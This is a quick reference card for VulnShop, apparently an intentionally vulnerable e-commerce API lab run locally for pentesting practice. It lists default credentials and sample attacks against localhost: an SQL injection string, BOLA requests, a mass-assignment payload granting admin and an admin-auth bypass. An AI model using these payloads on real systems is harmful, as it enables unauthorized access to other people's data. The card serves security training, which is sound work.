# VulnShop Quick Reference Card

## 🚀 Quick Start
```bash
cd "d:/PROJECTS/API Pentesting lab"
docker-compose up --build
```

Access:
- Frontend: http://localhost
- API: http://localhost:3001

## 🔑 Default Credentials
| User | Password | Role |
|------|----------|------|
| admin | password123 | admin |
| john_doe | password123 | user |

## 🎯 Top 5 Vulnerabilities to Try

### 1. BOLA (Easiest)
```bash
# Login as john_doe, then:
curl http://localhost:3001/api/users/1 \
  -H "Authorization: Bearer YOUR_TOKEN"
# You'll see admin's data!
```

### 2. SQL Injection
```
http://localhost:3001/api/products?search=' OR '1'='1
```

### 3. Mass Assignment
```json
POST /api/auth/register
{
  "username": "hacker",
  "password": "test123",
  "email": "hack@test.com",
  "role": "admin"
}
```

### 4. Broken Admin Auth
```
GET /api/admin/users?admin=true
# Works with any token!
```

### 5. Cart BOLA
```
GET /api/cart?user_id=1
# View admin's cart with your token
```

## 📚 Documentation Files

| File | Purpose |
|------|---------|
| README.md | Setup & getting started |
| VULNERABILITIES.md | Detailed vulnerability guide |
| TESTING_GUIDE.md | Burp Suite & Postman tutorials |
| postman_collection.json | Import into Postman |

## 🛠️ Useful Commands

```bash
# Start
docker-compose up

# Start with rebuild
docker-compose up --build

# Stop
docker-compose down

# Remove all data
docker-compose down -v

# View logs
docker-compose logs backend

# Check status
docker-compose ps
```

## 🔧 Troubleshooting

**Port already in use?**
Edit `docker-compose.yml` and change port mappings

**Database not initializing?**
```bash
docker-compose down -v
docker-compose up --build
```

**Can't access frontend?**
Check if http://localhost works (not localhost:80)

## 📱 Testing Tools

**Browser DevTools** - Press F12, go to Network tab

**Postman**
1. Import `postman_collection.json`
2. Set environment: base_url = http://localhost:3001
3. Run "Login" to get token

**Burp Suite**
1. Set proxy to 127.0.0.1:8080
2. Install CA cert from http://burpsuite
3. Intercept is OFF by default
4. Check Proxy → HTTP history

## 🎓 Learning Path

1. ✅ Register account on frontend
2. ✅ Browse products, add to cart
3. ✅ Place order
4. ✅ Try BOLA vulnerability
5. ✅ Setup Postman
6. ✅ Setup Burp Suite
7. ✅ Try all 7 scenarios in TESTING_GUIDE.md
8. ✅ Read VULNERABILITIES.md

## ⚠️ Remember

This is INTENTIONALLY VULNERABLE!
- Never deploy to production
- Never expose to internet
- Use only for learning
- Practice ethical hacking

---

Need more help? Read the full guides:
- Setup: README.md
- Vulnerabilities: VULNERABILITIES.md  
- Testing: TESTING_GUIDE.md
